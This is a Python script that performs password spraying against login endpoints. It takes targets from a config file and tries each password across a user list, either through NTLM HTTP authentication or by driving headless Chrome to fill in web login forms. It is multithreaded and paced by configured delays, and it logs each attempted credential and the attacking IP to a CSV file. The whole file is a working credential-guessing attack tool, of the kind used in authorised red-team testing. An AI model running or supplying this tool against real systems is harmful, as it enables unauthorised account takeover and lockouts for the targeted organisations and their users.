from requests_ntlm import HttpNtlmAuth
import requests as rq
import sys
import argparse
import urllib3
import datetime
import os

from threading import Thread, Barrier
from queue import Queue
from multiprocessing.dummy import Pool as ThreadPool
from functools import partial
from requests import get

import time
import configparser

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

#from webdriver_manager.chrome import ChromeDriverManager

from selenium.webdriver.chrome.options import Options

from selenium.webdriver.common.desired_capabilities import DesiredCapabilities

#ChromeDriverManager().install()

#path = os.getcwd()

#print(path)
#print(os.path.isfile('./chromedriver'))

# suppress ssl warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#main queue for result accumulation
queue = Queue()

csv_file = 'spray_out.csv'

#initial content
with open(csv_file,'w') as f:
    f.write('Task name,URL,username,password,response,AttackIP,time\n') # NO TRAILING NEWLINE

def consume():
	while True:
		if not queue.empty():
			i = queue.get()

			if i == "finish":
				return

			# Row comes out of queue; CSV writing goes here
			with open(csv_file,'a',newline='') as f:
				f.write(i + "\n")

consumer = Thread(target=consume)
consumer.setDaemon(True)
consumer.start()

ip = get('https://api.ipify.org').text
print('My public IP address is: {}'.format(ip))


def ntlm_login(uname,taskname, url, domain, password, threadDelay):

    ntlm_creds = HttpNtlmAuth("%s\\%s" % (domain, uname), password)
    resp = rq.get(url, auth=ntlm_creds, verify=False)
    row = taskname + "," + url + "," + domain + "\\" + uname + "," + password + "," + str(resp.status_code) + "," + format(ip) + ","+ str(datetime.datetime.now())
    queue.put(row)

    if not resp.status_code == 401:
        print ("[+] Alert!! Response code:  %s with :- %s\\%s : %s" % (str(resp.status_code),domain, uname, password))
    else:
        print ("[-] %s\\%s : %s" % (domain, uname, password))

    time.sleep(int(threadDelay))
    #sleep for the delay time and then die

def headless_login(uname,taskname, url, password, threadDelay, login_select,password_select,loginbtn_select,success_select,fail_select):

    print ("called headless with url %s username %s password %s" % (url, uname, password))

    #chromeOptions = webdriver.ChromeOptions()
    #chromeOptions.add_experimental_option("prefs", {"profile.managed_default_content_settings.images": 2})
    #chromeOptions.add_argument("--no-sandbox")
    #chromeOptions.add_argument("--disable-setuid-sandbox")

    #chromeOptions.add_argument("--remote-debugging-port=9222")  # this

    #chromeOptions.add_argument("--disable-dev-shm-using")
    #chromeOptions.add_argument("--disable-extensions")
    #chromeOptions.add_argument("--disable-gpu")
    #chromeOptions.add_argument("start-maximized")
    #chromeOptions.add_argument("disable-infobars")
    #chromeOptions.add_argument(r"user-data-dir=.\cookies\\test")

    #driver = webdriver.Chrome(chrome_options=chromeOptions)

    chrome_options = Options()
    chrome_options.add_argument('--headless')
    chrome_options.add_argument("--no-sandbox")
    #chrome_options.add_argument(r"user-data-dir=./app/")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-gpu")
    #chrome_options.add_argument("--remote-debugging-port=9222")  # this
    #chrome_prefs = {}
    #chrome_options.experimental_options["prefs"] = chrome_prefs
    #chrome_prefs["profile.default_content_settings"] = {"images": 2}

    caps = DesiredCapabilities().CHROME
    caps["pageLoadStrategy"] = "normal"  #  complete
    #caps["pageLoadStrategy"] = "eager"  #  interactive
    #caps["pageLoadStrategy"] = "none"

    driver = webdriver.Chrome(desired_capabilities=caps, options=chrome_options)
    #driver = webdriver.Chrome(options=chrome_options,executable_path='./chromedriver')
    #driver = webdriver.Chrome('.\chromedriver')
    driver.get(url)
    #print(driver.title)

    #print ("completed going to url %s username %s password %s" % (url, uname, password))

    login_element = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH,login_select)))
    password_element = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH,password_select)))
    login_button = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH,loginbtn_select)))

    #print ("Entering username username %s password %s" % (uname, password))
    login_element.send_keys(uname)

    #print ("Entering password username %s password %s" % (uname, password))
    password_element.send_keys(password)

    #driver.refresh()
    #print ("clickin login username %s password %s" % (uname, password))
    time.sleep(1)
    login_button.click()
    result = ""
    try:
        fail_element = WebDriverWait(driver,10).until(EC.presence_of_element_located((By.XPATH,fail_select)))
        print ("failed login")
        result = "Fail"
    except Exception as e:
        try:
            success_element =WebDriverWait(driver,10).until(EC.presence_of_element_located((By.XPATH,success_select)))
            print ("logged in")
            result = "Success"
        except Exception as e:
            print ("failed to login")
            result = "Fail"

    #print(driver.current_url)
    #driver.close()
    driver.stop_client()
    driver.close()
    driver.quit()

    row = taskname + "," + url + "," + uname + "," + password + "," + result + "," + format(ip) + ","+ str(datetime.datetime.now())
    queue.put(row)

    print ("completed headless with url %s username %s password %s with status %s " % (url, uname, password, result))

    time.sleep(int(threadDelay))
    #sleep for the delay time and then die



def main():

    global browser

    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--config", help="config ini file with target configs", required=True)
    args = parser.parse_args()

    config = configparser.ConfigParser()
    config.read(args.config)
    try:
        userDelay = config['DEFAULT']['UserDelay']
        passDelay = config['DEFAULT']['UserDelay']
        defuserList = config['DEFAULT']['userList']
        defpassList = config['DEFAULT']['userList']
        numThreads = config['DEFAULT']['Threads']
    except Exception as e:
        print("Failed to load defaults from config!! Exiting!!!")
        exit()

    # Initalization complete
    # start main loop of config file tasks parsing
    for section in config.sections():
        taskName = str(section)
        print (taskName)
        if config[section]["userList"] != "":
            userList = config[section]["userList"]
        else:
            userList = defuserList

        if config[section]["passList"] != "":
            passList = config[section]["passList"]
        else:
            passList = defpassList

        try:
            url = config[section]["URL"]
            type = config[section]["Type"]
        except Exception as e:
            print ("Missing important parameters in config for %s" % taskName)
            exit()

        #print (userList)
        #print (passList)
        #print (url)
        #print (type)

        #Parse type and start Attack

        #parse credential lists
        users = [item.rstrip('\n').rstrip() for item  in open(userList, 'r').readlines()]
        unum = len(users)

        passwords = [item.rstrip('\n').rstrip() for item  in open(passList, 'r').readlines()]
        passnum = len(passwords)

        try:
            if type == "ntlm":

                domain = config[section]["Domain"]
                print ("[*] Activity Start Time : " + str(datetime.datetime.now()))
                # prepare the arguments for do_login function
                # this list will then be passed to multiprocessing pool
                # only uname parameter of do_login will change rest remain the same.
                # partial() will keep the rest of the parameters specified constant
                for password in passwords:

                    do_login_args = partial(ntlm_login, taskname=taskName, url=url, domain=domain, password=password,threadDelay=userDelay)

                    print ("[*] Starting NTLM based password spray against %s with %s users using the password %s !" % (url, unum, password))

                    # https://stackoverflow.com/questions/2846653/how-can-i-use-threading-in-python
                    pool = ThreadPool(int(numThreads))
                    results = pool.map(do_login_args, users)
                    time.sleep(int(passDelay))

                print ("[*] Activity End Time : " + str(datetime.datetime.now()))
            elif type == "headless":

                login_select = config[section]["username_field"]
                password_select = config[section]["password_field"]
                loginbtn_select = config[section]["loginbtn_element"]
                success_select = config[section]["sucess_element"]
                fail_select = config[section]["fail_element"]

                for password in passwords:

                    #barrier = Barrier(int(numThreads))

                    do_login_args = partial(headless_login, taskname=taskName, url=url, password=password,threadDelay=userDelay, login_select=login_select,password_select=password_select,loginbtn_select=loginbtn_select,success_select=success_select,fail_select=fail_select)

                    print ("[*] Starting headless browser based password spray against %s with %s users using the password %s !" % (url, unum, password))


                    # https://stackoverflow.com/questions/2846653/how-can-i-use-threading-in-python
                    pool = ThreadPool(int(numThreads))
                    #results = pool.map_async(do_login_args, users)
                    results = pool.map(do_login_args, users)
                    #results.get()

                    print("Completed one password cycle")
                    time.sleep(int(passDelay))

                print ("[*] Activity End Time : " + str(datetime.datetime.now()))




        except Exception as e:
            print(e)
            raise
            exit()


    queue.put("finish")
    consumer.join()


if __name__ == "__main__":
    #asyncio.run(main())
    main()
    #asyncio.get_event_loop().run_until_complete(main())
